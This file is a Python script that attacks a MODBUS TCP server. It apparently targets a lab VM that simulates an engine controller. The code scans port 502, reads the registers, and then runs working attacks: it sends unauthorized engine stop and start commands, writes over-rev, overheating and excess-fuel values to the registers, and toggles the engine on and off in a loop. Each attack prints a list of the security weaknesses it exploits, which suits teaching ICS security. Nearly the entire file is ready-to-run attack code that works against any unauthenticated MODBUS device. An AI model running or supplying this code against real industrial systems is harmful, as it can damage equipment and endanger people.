#!/usr/bin/env python3
"""
Host Machine MODBUS Attack Script
Targets the Linux VM's MODBUS TCP server (port 502)
Demonstrates various security vulnerabilities in industrial control systems
"""

from pyModbusTCP.client import ModbusClient
import time
import socket
import sys
from datetime import datetime
import threading
import argparse

class ModbusAttacker:
    def __init__(self):
        self.registers = {
            'status': 0,      # Engine status (0=stopped, 1=running)
            'rpm': 1,         # Engine RPM
            'temp': 2,        # Engine temperature
            'fuel_flow': 3,   # Fuel flow rate
            'load': 4         # Engine load
        }
        
    def scan_target(self, target_ip, port=502):
        """Scan for MODBUS service on target"""
        print(f"\n{'='*60}")
        print(f"SCANNING TARGET: {target_ip}:{port}")
        print(f"{'='*60}")
        
        try:
            # Check if port is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            
            if result == 0:
                print(f"✓ Port {port} is OPEN on {target_ip}")
                
                # Try MODBUS connection
                client = ModbusClient(host=target_ip, port=port, auto_open=True, auto_close=True)
                if client.open():
                    print(f"✓ MODBUS TCP service confirmed!")
                    client.close()
                    return True
                else:
                    print(f"✗ Port open but MODBUS service not responding")
                    return False
            else:
                print(f"✗ Port {port} is CLOSED on {target_ip}")
                return False
                
        except Exception as e:
            print(f"✗ Error scanning {target_ip}:{port}: {e}")
            return False
    
    def read_current_state(self, target_ip, port=502):
        """Read current engine state"""
        print(f"\n{'='*60}")
        print(f"READING CURRENT ENGINE STATE")
        print(f"Target: {target_ip}:{port}")
        print(f"{'='*60}")
        
        client = ModbusClient(host=target_ip, port=port, auto_open=True, auto_close=True)
        
        try:
            if not client.open():
                print(f"✗ Failed to connect to {target_ip}:{port}")
                return None
            
            engine_data = {}
            
            for reg_name, reg_addr in self.registers.items():
                try:
                    value = client.read_holding_registers(reg_addr, 1)
                    if value:
                        raw_value = value[0]
                        
                        # Convert special values
                        if reg_name == 'fuel_flow':
                            display_value = raw_value / 100.0
                        else:
                            display_value = raw_value
                        
                        engine_data[reg_name] = {
                            'raw': raw_value,
                            'display': display_value,
                            'register': reg_addr
                        }
                        
                        status_icon = "🟢" if reg_name == 'status' and raw_value == 1 else "🔴" if reg_name == 'status' and raw_value == 0 else "📊"
                        print(f"  {status_icon} {reg_name.upper()}: {display_value} (Register {reg_addr})")
                    else:
                        print(f"  ❌ {reg_name.upper()}: Failed to read (Register {reg_addr})")
                        
                except Exception as e:
                    print(f"  ❌ {reg_name.upper()}: Error - {e}")
            
            return engine_data
            
        except Exception as e:
            print(f"✗ Error reading registers: {e}")
            return None
        finally:
            client.close()
    
    def attack_engine_stop(self, target_ip, port=502):
        """Attack 1: Unauthorized Engine Stop"""
        print(f"\n{'!'*80}")
        print(f"{'!'*80}")
        print(f"🚨 ATTACK 1: UNAUTHORIZED ENGINE SHUTDOWN")
        print(f"🎯 Target: {target_ip}:{port}")
        print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'!'*80}")
        print(f"{'!'*80}")
        
        client = ModbusClient(host=target_ip, port=port, auto_open=True, auto_close=True)
        
        try:
            if not client.open():
                print(f"✗ Failed to connect to target {target_ip}:{port}")
                return False
            
            # Check current status
            current_status = client.read_holding_registers(self.registers['status'], 1)
            if current_status:
                print(f"Current engine status: {current_status[0]} ({'RUNNING' if current_status[0] == 1 else 'STOPPED'})")
                
                if current_status[0] == 0:
                    print("Engine is already stopped - attack not needed")
                    return True
            
            # Execute the attack
            print("\n🚨 Executing STOP command via MODBUS TCP...")
            print("📝 Writing 0 to status register (0x0000)...")
            
            success = client.write_single_register(self.registers['status'], 0)
            
            if success:
                print(f"\n{'!'*80}")
                print(f"💥 EXPLOIT SUCCESSFUL!")
                print(f"🚨 UNAUTHORIZED STOP COMMAND SENT!")
                print(f"💥 ENGINE SHUTDOWN INITIATED!")
                print(f"{'!'*80}")
                
                # Verify the attack worked
                time.sleep(2)
                new_status = client.read_holding_registers(self.registers['status'], 1)
                if new_status:
                    print(f"\n🔍 Verification - New engine status: {new_status[0]}")
                    if new_status[0] == 0:
                        print("✅ Engine successfully stopped by unauthorized command")
                    else:
                        print("❓ Engine status unexpected after attack")
                
                print(f"\n{'-'*60}")
                print("🔒 SECURITY IMPLICATIONS:")
                print("❌ No authentication required for critical commands")
                print("❌ No encryption of sensitive control data")
                print("❌ No access control or authorization checks")
                print("❌ Engine can be stopped by anyone on the network")
                print("❌ Real-world consequences could be catastrophic")
                print(f"{'-'*60}")
                
                return True
            else:
                print("❌ Failed to send stop command")
                return False
                
        except Exception as e:
            print(f"❌ Error during attack: {e}")
            return False
        finally:
            client.close()
    
    def attack_engine_start(self, target_ip, port=502):
        """Attack 2: Unauthorized Engine Start"""
        print(f"\n{'!'*80}")
        print(f"🚨 ATTACK 2: UNAUTHORIZED ENGINE START")
        print(f"🎯 Target: {target_ip}:{port}")
        print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'!'*80}")
        
        client = ModbusClient(host=target_ip, port=port, auto_open=True, auto_close=True)
        
        try:
            if not client.open():
                print(f"✗ Failed to connect to target {target_ip}:{port}")
                return False
            
            # Check current status
            current_status = client.read_holding_registers(self.registers['status'], 1)
            if current_status and current_status[0] != 0:
                print("Engine is not stopped - start attack not applicable")
                return True
            
            # Execute start attack
            print("🚨 Sending unauthorized START command...")
            print("📝 Writing 1 to status register (0x0001)...")
            
            success = client.write_single_register(self.registers['status'], 1)
            
            if success:
                print("✅ Unauthorized START command sent successfully!")
                time.sleep(2)
                
                # Check if it worked
                new_status = client.read_holding_registers(self.registers['status'], 1)
                if new_status and new_status[0] == 1:
                    print("✅ Engine started by unauthorized command")
                else:
                    print("❓ Engine did not start as expected")
                
                return True
            else:
                print("❌ Failed to send start command")
                return False
                
        except Exception as e:
            print(f"❌ Error during start attack: {e}")
            return False
        finally:
            client.close()
    
    def attack_parameter_manipulation(self, target_ip, port=502):
        """Attack 3: Parameter Manipulation"""
        print(f"\n{'!'*80}")
        print(f"🚨 ATTACK 3: PARAMETER MANIPULATION")
        print(f"🎯 Target: {target_ip}:{port}")
        print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'!'*80}")
        
        client = ModbusClient(host=target_ip, port=port, auto_open=True, auto_close=True)
        
        try:
            if not client.open():
                print(f"✗ Failed to connect to target {target_ip}:{port}")
                return False
            
            print("🚨 Manipulating engine parameters...")
            
            # Read current values
            print("\n📊 Current parameter values:")
            current_values = {}
            for reg_name, reg_addr in self.registers.items():
                if reg_name != 'status':  # Don't modify status
                    value = client.read_holding_registers(reg_addr, 1)
                    if value:
                        current_values[reg_name] = value[0]
                        print(f"  {reg_name}: {value[0]}")
            
            # Manipulate parameters
            print("\n🚨 Injecting malicious parameter values...")
            
            # Set dangerous RPM
            dangerous_rpm = 9999  # Over-revving
            print(f"📝 Setting RPM to dangerous value: {dangerous_rpm}")
            client.write_single_register(self.registers['rpm'], dangerous_rpm)
            
            # Set dangerous temperature
            dangerous_temp = 999  # Overheating
            print(f"📝 Setting temperature to dangerous value: {dangerous_temp}")
            client.write_single_register(self.registers['temp'], dangerous_temp)
            
            # Set dangerous fuel flow
            dangerous_fuel = 9999  # Excessive fuel
            print(f"📝 Setting fuel flow to dangerous value: {dangerous_fuel}")
            client.write_single_register(self.registers['fuel_flow'], dangerous_fuel)
            
            time.sleep(1)
            
            # Verify the manipulation
            print("\n📊 New parameter values:")
            for reg_name, reg_addr in self.registers.items():
                if reg_name != 'status':
                    value = client.read_holding_registers(reg_addr, 1)
                    if value:
                        print(f"  {reg_name}: {value[0]} {'🚨' if value[0] > 1000 else ''}")
            
            print(f"\n{'-'*60}")
            print("🔒 SECURITY IMPLICATIONS:")
            print("❌ No validation of parameter ranges")
            print("❌ No safety checks on critical values")
            print("❌ Engine could be damaged by malicious values")
            print("❌ No logging of unauthorized parameter changes")
            print(f"{'-'*60}")
            
            return True
            
        except Exception as e:
            print(f"❌ Error during parameter manipulation: {e}")
            return False
        finally:
            client.close()
    
    def attack_continuous_monitoring(self, target_ip, port=502, duration=30):
        """Attack 4: Continuous Monitoring and Interference"""
        print(f"\n{'!'*80}")
        print(f"🚨 ATTACK 4: CONTINUOUS MONITORING & INTERFERENCE")
        print(f"🎯 Target: {target_ip}:{port}")
        print(f"⏱️ Duration: {duration} seconds")
        print(f"{'!'*80}")
        
        client = ModbusClient(host=target_ip, port=port, auto_open=True, auto_close=True)
        
        try:
            if not client.open():
                print(f"✗ Failed to connect to target {target_ip}:{port}")
                return False
            
            print("🚨 Starting continuous monitoring and interference...")
            print("📡 Intercepting and modifying MODBUS traffic...")
            
            start_time = time.time()
            interference_count = 0
            
            while time.time() - start_time < duration:
                try:
                    # Read current state
                    status = client.read_holding_registers(self.registers['status'], 1)
                    rpm = client.read_holding_registers(self.registers['rpm'], 1)
                    
                    if status and rpm:
                        current_time = datetime.now().strftime('%H:%M:%S')
                        print(f"[{current_time}] Status: {status[0]}, RPM: {rpm[0]}")
                        
                        # Random interference
                        if interference_count % 5 == 0:  # Every 5th cycle
                            if status[0] == 1:  # If engine is running
                                print(f"🚨 Interference: Sending stop command...")
                                client.write_single_register(self.registers['status'], 0)
                            else:
                                print(f"🚨 Interference: Sending start command...")
                                client.write_single_register(self.registers['status'], 1)
                        
                        interference_count += 1
                    
                    time.sleep(2)
                    
                except Exception as e:
                    print(f"❌ Error during monitoring: {e}")
                    break
            
            print(f"\n📊 Monitoring complete:")
            print(f"  - Duration: {duration} seconds")
            print(f"  - Interference attempts: {interference_count}")
            
            return True
            
        except Exception as e:
            print(f"❌ Error during continuous monitoring: {e}")
            return False
        finally:
            client.close()
    
    def full_attack_sequence(self, target_ip, port=502):
        """Execute full attack sequence"""
        print(f"\n{'='*80}")
        print(f"🚨 FULL ATTACK SEQUENCE")
        print(f"🎯 Target: {target_ip}:{port}")
        print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*80}")
        
        # Step 1: Scan and read current state
        if not self.scan_target(target_ip, port):
            print("❌ Target not accessible. Check network connectivity.")
            return False
        
        current_state = self.read_current_state(target_ip, port)
        if not current_state:
            print("❌ Failed to read current state.")
            return False
        
        # Step 2: Attack 1 - Unauthorized Stop
        print("\n" + "="*60)
        print("🚨 EXECUTING ATTACK 1: UNAUTHORIZED ENGINE STOP")
        print("="*60)
        self.attack_engine_stop(target_ip, port)
        
        time.sleep(3)
        
        # Step 3: Attack 2 - Unauthorized Start
        print("\n" + "="*60)
        print("🚨 EXECUTING ATTACK 2: UNAUTHORIZED ENGINE START")
        print("="*60)
        self.attack_engine_start(target_ip, port)
        
        time.sleep(3)
        
        # Step 4: Attack 3 - Parameter Manipulation
        print("\n" + "="*60)
        print("🚨 EXECUTING ATTACK 3: PARAMETER MANIPULATION")
        print("="*60)
        self.attack_parameter_manipulation(target_ip, port)
        
        time.sleep(3)
        
        # Step 5: Attack 4 - Continuous Monitoring
        print("\n" + "="*60)
        print("🚨 EXECUTING ATTACK 4: CONTINUOUS MONITORING")
        print("="*60)
        self.attack_continuous_monitoring(target_ip, port, duration=15)
        
        # Final state
        print("\n" + "="*60)
        print("📊 FINAL ENGINE STATE")
        print("="*60)
        self.read_current_state(target_ip, port)
        
        print(f"\n{'!'*80}")
        print(f"🚨 ATTACK SEQUENCE COMPLETE")
        print(f"💥 All vulnerabilities successfully exploited!")
        print(f"🔒 Industrial control systems are vulnerable!")
        print(f"{'!'*80}")
        
        return True

def main():
    parser = argparse.ArgumentParser(description='MODBUS TCP Attack Script')
    parser.add_argument('target_ip', help='Target IP address (Linux VM)')
    parser.add_argument('--port', type=int, default=502, help='MODBUS port (default: 502)')
    parser.add_argument('--attack', choices=['scan', 'read', 'stop', 'start', 'params', 'monitor', 'full'], 
                       default='full', help='Attack type (default: full)')
    
    args = parser.parse_args()
    
    attacker = ModbusAttacker()
    
    print(f"\n{'='*80}")
    print(f"🚨 MODBUS TCP ATTACK SCRIPT")
    print(f"🎯 Target: {args.target_ip}:{args.port}")
    print(f"🔧 Attack Type: {args.attack}")
    print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*80}")
    
    if args.attack == 'scan':
        attacker.scan_target(args.target_ip, args.port)
    elif args.attack == 'read':
        attacker.read_current_state(args.target_ip, args.port)
    elif args.attack == 'stop':
        attacker.attack_engine_stop(args.target_ip, args.port)
    elif args.attack == 'start':
        attacker.attack_engine_start(args.target_ip, args.port)
    elif args.attack == 'params':
        attacker.attack_parameter_manipulation(args.target_ip, args.port)
    elif args.attack == 'monitor':
        attacker.attack_continuous_monitoring(args.target_ip, args.port)
    elif args.attack == 'full':
        attacker.full_attack_sequence(args.target_ip, args.port)
    
    print(f"\n{'='*80}")
    print(f"🏁 Attack script completed")
    print(f"{'='*80}")

if __name__ == "__main__":
    main() 